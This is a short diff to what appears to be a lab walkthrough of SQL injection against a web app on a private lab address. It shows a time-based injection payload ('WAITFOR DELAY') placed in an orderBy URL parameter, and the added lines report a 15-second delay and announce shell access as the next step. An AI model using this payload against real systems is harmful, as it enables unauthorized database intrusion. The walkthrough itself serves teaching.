@@ -111,6 +111,10 @@ using an offsec tool `ghauri`  we can see the database available. which proves t
 
 using payload `WAITFOR DELAY '00:00:10'--+-` on url `http://192.168.56.21/Students?SearchString=s&orderBy=Firstname%20WAITFOR%20DELAY%20%2700:00:10%27--+-` we delayed the web app for 10 secs. let's do 15 secs. 
 
+<img width="1911" height="936" alt="image" src="https://github.com/user-attachments/assets/d7291642-1682-4b96-a69b-4014a76ba16c" />
+
+We got the web app to delay loading for 15 secs. Now the juicy part, Poping Shell. 
+<br></br>
 
 
 
